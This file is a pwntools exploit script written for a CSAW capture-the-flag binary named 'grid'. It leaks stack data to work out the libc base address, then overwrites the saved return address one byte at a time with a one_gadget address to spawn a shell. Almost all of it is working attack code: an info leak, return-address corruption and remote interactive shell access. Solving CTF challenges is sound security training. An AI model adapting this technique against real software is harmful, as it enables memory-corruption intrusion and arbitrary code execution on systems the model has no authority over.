#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./grid"
LIBCNAME = "./libc-2.27.so"

hosts = ("pwn.chal.csaw.io","localhost","localhost")
ports = (5013,12300,23947)
rhp1 = {'host':hosts[0],'port':ports[0]}    #for actual server
rhp2 = {'host':hosts[1],'port':ports[1]}    #for localhost 
rhp3 = {'host':hosts[2],'port':ports[2]}    #for localhost running on docker
context(os='linux',arch='amd64')
binf = ELF(FILENAME)
libc = ELF(LIBCNAME) if LIBCNAME!="" else None


## utilities #########################################

def hoge():
  pass

def pl(x,y,v):
  c.recvuntil("shape> ")
  c.sendline(str(v))
  c.recvuntil("loc> ")
  c.sendline(str(x))
  c.sendline(str(y))

def display():
  c.recvuntil("shape> ")
  c.sendline("d")
  c.recvuntil("Displaying\n")

def overwrite_RA(addr):
  global c
  abytes = b""
  for i in range(8):
    if addr>>(i*8) == 0:
      abytes += p8(0x00)
    else:
      abytes += p8(addr>>(i*8) & 0xff)

  print("[+] overwriting as :{}".format(hex(addr)))
  for i in range(8):
    print("  writing {} th: {}".format(hex(i), hex(u8(abytes[i]))))
    pl(0, 0x78+i, abytes[i])

## exploit ###########################################

def exploit():
  global c

  display()
  leak = b""
  for i in range(10):
    leak += c.recv(10)
    c.recv(1)

  #for i in range(len(leak)):
  #  print("{}".format(hex(leak[i])))
  nleak = []
  for i in range(100//8):
    nleak += [unpack(leak[i*8:(i+1)*8])]

  for i in range(len(nleak)):
    print("{}".format(hex(nleak[i])))

  libstdcbase = nleak[3] - 0xfb5da
  print("[+] libstdcbase: {}".format(hex(libstdcbase)))

  libcbase = libstdcbase + 0x389000 #??
  print("[+] libcbase: {}".format(hex(libcbase)))

  ogs = [0x4f365, 0x4f3c2, 0x10a45c]
  overwrite_RA(libcbase + 0x4f365)


## main ##############################################

if __name__ == "__main__":
    global c
    
    if len(sys.argv)>1:
      if sys.argv[1][0]=="d":
        cmd = """
          set follow-fork-mode parent
        """
        c = gdb.debug(FILENAME,cmd)
      elif sys.argv[1][0]=="r":
        c = remote(rhp1["host"],rhp1["port"])
      elif sys.argv[1][0]=="v":
        c = remote(rhp3["host"],rhp3["port"])
    else:
        c = remote(rhp2['host'],rhp2['port'])
    exploit()
    c.interactive()
